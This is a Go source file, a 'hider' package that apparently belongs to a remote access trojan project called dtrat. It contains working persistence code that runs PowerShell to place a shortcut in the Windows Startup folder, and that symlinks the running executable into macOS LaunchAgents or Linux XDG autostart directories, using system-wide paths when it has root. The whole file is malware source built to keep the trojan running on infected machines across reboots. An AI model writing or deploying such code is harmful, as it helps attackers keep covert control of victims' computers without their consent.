package hider

import (
	"dtrat/engine"
	"dtrat/errs"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

type Hider struct {
	eng *engine.Engine
}

func NewHider(eng *engine.Engine) (*Hider, error) {
	hdr := Hider{
		eng: eng,
	}
	return &hdr, nil
}

func (h *Hider) autostartOnWin(executablePath string) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	exeName := filepath.Base(executablePath)
	lnkName := exeName[:len(exeName)-len(filepath.Ext(exeName))] + ".lnk"
	destPath := filepath.Join(startupPath, lnkName)

	psCommand := fmt.Sprintf(
		`$WshShell = New-Object -ComObject WScript.Shell; `+
			`$Shortcut = $WshShell.CreateShortcut('%s'); `+
			`$Shortcut.TargetPath = '%s'; `+
			`$Shortcut.WorkingDirectory = '%s'; `+
			`$Shortcut.Save()`,
		destPath, executablePath, filepath.Dir(executablePath),
	)

	cmd := exec.Command("powershell", "-Command", psCommand)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to create shortcut via PowerShell: %w (output: %s)", err, string(output))
	}

	return nil
}

func (h *Hider) autostartOnLinux(executablePath string) error {
	var autostartDir string
	admin := h.eng.Info.IsRoot()

	switch runtime.GOOS {
	case "darwin":
		if admin {
			autostartDir = "/Library/LaunchAgents"
		} else {
			autostartDir = filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
		}
	case "linux":
		if admin {
			autostartDir = "/etc/xdg/autostart"
		} else {
			autostartDir = filepath.Join(os.Getenv("HOME"), ".config", "autostart")
		}
	default:
		return errs.ErrUnsupportedOs
	}

	err := os.MkdirAll(autostartDir, 0755)
	if err != nil {
		return fmt.Errorf("os.MkdirAll: %w", err)
	}

	destPath := filepath.Join(autostartDir, filepath.Base(executablePath))
	err = os.Symlink(executablePath, destPath)
	if err != nil {
		return fmt.Errorf("os.Symlink: %w", err)
	}
	return nil
}

func (h *Hider) AddToStartup() error {
	executable, err := os.Executable()
	if err != nil {
		return fmt.Errorf("os.Executable: %w", err)
	}

	if runtime.GOOS == "windows" {
		return h.autostartOnWin(executable)
	} else {
		return h.autostartOnLinux(executable)
	}
}

func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	info, err := os.Stat(src)
	if err != nil {
		return err
	}

	err = os.WriteFile(dst, input, info.Mode())
	if err != nil {
		return err
	}

	return nil
}
